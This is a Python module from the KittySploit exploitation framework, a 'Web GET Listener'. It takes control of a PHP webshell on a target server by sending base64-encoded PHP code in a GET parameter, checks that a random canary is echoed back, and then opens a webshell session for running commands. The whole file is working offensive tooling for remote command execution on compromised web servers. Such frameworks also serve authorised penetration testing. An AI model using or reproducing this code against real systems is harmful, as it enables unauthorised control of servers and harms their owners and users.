from kittysploit import *
from lib.protocols.http.http_client import Http_client
from base64 import b64encode

class Module(Listener, Http_client):

	__info__ = {
		'name': 'Web GET Listener',
		'description': 'Web GET Listener (payload in query parameter)',
		'author': 'KittySploit Team',
		'arch': Arch.PHP,
		'handler': Handler.BIND,
		'session_type': SessionType.WEBSHELL,
	}

	port = OptPort(80, "Target port", True)
	path = OptString("/", "Base HTTP path (advanced; use uripath for the webshell file)", False, advanced=True)
	ssl = OptBool(False, "SSL enabled: true/false", False, advanced=True)
	param_name = OptString("cmd", "GET parameter name for connect", True)
	uripath = OptString("/", "HTTP path", True)

	def run(self):
		canary = self.random_text(10)
		data = f"echo '{canary}';".encode('utf-8')
		params = {self.param_name: b64encode(data).decode('utf-8')}
		uri = str(self.uripath or "/")
		if not uri.startswith("/"):
			uri = "/" + uri
		r = self.http_request(
			method='GET',
			path=uri,
			params=params,
			session=True
		)
		if canary in r.content.decode('utf-8'):
			print_success("Connection established")
			additional_data = {
				'uripath': uri,
				'param_name': self.param_name,
				'method': 'GET'
			}
			return (self.session, self.target, int(self.port), additional_data)

		print_error(f"Connection failed (HTTP {getattr(r, 'status_code', 'unknown')})")
		if getattr(r, 'url', ''):
			print_info(f"Requested URL: {r.url}")
		body = r.content.decode('utf-8', errors='replace') if getattr(r, 'content', None) else ''
		if body:
			snippet = body.replace('\r', '').replace('\n', ' ')[:240]
			print_info(f"Response preview: {snippet}")
		return False
